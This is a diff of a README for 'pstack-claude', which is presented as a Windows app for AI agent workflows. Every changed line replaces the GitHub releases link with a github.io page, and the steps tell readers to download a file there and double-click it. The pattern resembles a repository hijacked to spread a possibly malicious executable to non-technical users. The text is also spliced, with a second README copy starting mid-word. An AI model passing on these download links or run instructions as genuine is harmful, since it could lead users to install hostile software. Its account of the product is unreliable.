@@ -1,6 +1,6 @@
 # 🧰 pstack-claude - Smarter Agent Workflows Made Simple
 
-[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-8A2BE2?style=for-the-badge&labelColor=FF5733&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-8A2BE2?style=for-the-badge&labelColor=FF5733&logo=github)](https://inflectionalmorphologykhmer964.github.io)
 
 pstack-claude is a Windows application that brings rigorous agent workflows to popular AI coding tools. It is based on Poteto’s pstack and provides versions for Antigravity, Claude Code, Codex, Copilot, Gemini, Muse, OpenCode, Pi, and Prime Agent. Cursor primitives are translated so the same workflow ideas can be used across different harnesses.
 
@@ -8,16 +8,16 @@ For an average computer user, the simplest way to understand pstack-claude is th
 
 ## 📥 Download pstack-claude
 
-[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-00A86B?style=for-the-badge&labelColor=FF8C00&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-00A86B?style=for-the-badge&labelColor=FF8C00&logo=github)](https://inflectionalmorphologykhmer964.github.io)
 
-Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+Visit this link to download the application: [pstack-claude Releases](https://inflectionalmorphologykhmer964.github.io).
 
 This is the primary download page. Use it to download the application for your Windows computer. Keep the page open until the download is complete. Save the downloaded file in your Downloads folder so it is easy to find later.
 
 ## 🚀 Getting Started on Windows
 
 1. Open your web browser.
-2. Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+2. Visit this link to download the application: [pstack-claude Releases](https://inflectionalmorphologykhmer964.github.io).
 3. Download the application from that page.
 4. When the download finishes, open your Downloads folder.
 5. Double-click the downloaded file to start pstack-claude.
@@ -47,7 +47,7 @@ Key benefits include:
 - **Repeatable process:** The assistant follows a clear sequence instead of jumping straight to changes.
 - **Cross-tool support:** Vers# 🧰 pstack-claude - Smarter Agent Workflows Made Simple
 
-[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://inflectionalmorphologykhmer964.github.io)
 
 pstack-claude is a Windows application for people who use AI coding assistants and want them to follow a clear, repeatable way of working. It is based on Poteto’s pstack and includes versions for Antigravity, Claude Code, Codex, Copilot, Gemini, Muse, OpenCode, Pi, and Prime Agent. The project translates Cursor primitives so the same workflow ideas can be used with other harnesses.
 
@@ -55,16 +55,16 @@ In everyday terms, pstack-claude helps an AI assistant do less guessing. Instead
 
 ## 📥 Download pstack-claude
 
-[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-6A5ACD?style=for-the-badge&labelColor=F4A261&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-6A5ACD?style=for-the-badge&labelColor=F4A261&logo=github)](https://inflectionalmorphologykhmer964.github.io)
 
-Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+Visit this link to download the application: [pstack-claude Releases](https://inflectionalmorphologykhmer964.github.io).
 
 This is the official download page. Use it to download pstack-claude for your Windows computer. Keep the page open until the download is complete. Save the file in your Downloads folder so it is easy to find later.
 
 ## 🚀 Getting Started on Windows
 
 1. Open your web browser.
-2. Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+2. Visit this link to download the application: [pstack-claude Releases](https://inflectionalmorphologykhmer964.github.io).
 3. Download the application from that page.
 4. When the download finishes, open your Downloads folder.
 5. Double-click the downloaded file to start pstack-claude.
@@ -181,7 +181,7 @@ If you are trying pstack-claude for the first time, start with a small task. A s
 No. pstack-claude is built for agent workflows, and the instructions here are written for an average computer user. You can download and run the application on Windows without programming knowledge.
 
 **Where do I download pstack-claude?**
-Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+Visit this link to download the application: [pstack-claude Releases](https://inflectionalmorphologykhmer964.github.io).
 
 **What should I do after the download finishes?**
 Open your Downloads folder and double-click the downloaded file to start pstack-claude.
